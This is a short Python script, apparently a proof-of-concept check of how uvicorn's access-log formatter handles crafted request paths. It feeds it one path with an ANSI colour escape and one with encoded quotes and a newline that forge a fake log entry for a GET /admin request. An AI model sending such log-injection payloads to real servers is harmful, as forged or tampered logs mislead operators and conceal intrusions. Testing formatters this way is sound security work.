import logging
from urllib.parse import unquote
from uvicorn.logging import AccessFormatter

fmt = AccessFormatter(fmt='%(levelprefix)s %(client_addr)s - "%(request_line)s" %(status_code)s', use_colors=False)
for target in ["/%1B[31mRED", "/x%20HTTP/1.1%22%20200%0AINFO:%20%20%20%20%201.2.3.4:1%20-%20%22GET%20/admin"]:
    r = logging.LogRecord("uvicorn.access", logging.INFO, "", 1, "", (), None)
    r.scope = {"method": "GET", "http_version": "1.1", "root_path": "", "path": unquote(target), "query_string": b"", "client": ("127.0.0.1", 5000)}
    r.status_code = 200
    print(repr(fmt.format(r)))
    print(fmt.format(r))
